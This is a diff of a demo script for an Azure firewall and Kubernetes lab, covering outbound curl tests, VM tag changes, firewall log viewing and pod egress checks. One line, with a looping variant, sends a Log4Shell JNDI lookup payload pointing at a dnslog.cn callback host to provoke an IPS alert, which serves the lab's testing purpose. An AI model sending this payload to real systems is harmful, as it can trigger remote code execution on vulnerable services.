@@ -29,10 +29,10 @@ ssh cp
 
 # make connection from U1
 ssh u1 curl ip.iol.cz/ip/ -s
-# 10 times
-1..10 | % { ssh u1 curl ip.iol.cz/ip/ -s }
-1..10 | % { ssh u1 curl ipconfig.me -Ls }
-1..10 | % { ssh u1 curl ifconfig.me -Ls }
+# 5 times
+1..5 | % { ssh u1 curl ip.iol.cz/ip/ -s }
+1..5 | % { ssh u1 curl ipconfig.me -Ls }
+1..5 | % { ssh u1 curl ifconfig.me -Ls }
 # IPS incident 
 ssh u1 curl ip.iol.cz/ip/ -m1 -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}'
 # while true; do curl ip.iol.cz/ip/ -m1 -H 'X-Api-Version: ${jndi:ldap://xxx.dnslog.cn/a}'; sleep 5; done
@@ -43,6 +43,9 @@ az vm show --resource-group rg-ademo --name ubuntu1 --query tags
 az vm update --resource-group rg-ademo --name ubuntu1 --set tags.env=prod tags.app=ubuntu
 # put u1 to test
 az vm update --resource-group rg-ademo --name ubuntu1 --set tags.env=test tags.app=ubuntu
+
+# logs in console
+ssh cp 'fw log -l -p -n -f | grep " Ubuntu test to Internet"'
 
 # check cluster readyness
 terraform output -raw kube_config > $env:TEMP/k.config
@@ -75,4 +78,8 @@ kubectl get pods -n demo -o wide --show-labels
 kubectl get pods -n demo -o name -l app=webka1 | select -last 1 | % { kubectl -n demo label $_ env=test --overwrite  }
 kubectl get pods -n demo -o wide --show-labels
 
+# try (dropped) connection from default ns
+kubectl get pods -o name | % { Write-Host $_; kubectl exec -it $_ -- curl ifconfig.me -L -m1  }
+# vs from demo ns
+kubectl get pods -o name -n demo | % { Write-Host $_;  kubectl -n demo exec -it $_ -- curl ifconfig.me -L -m1  }
 ```
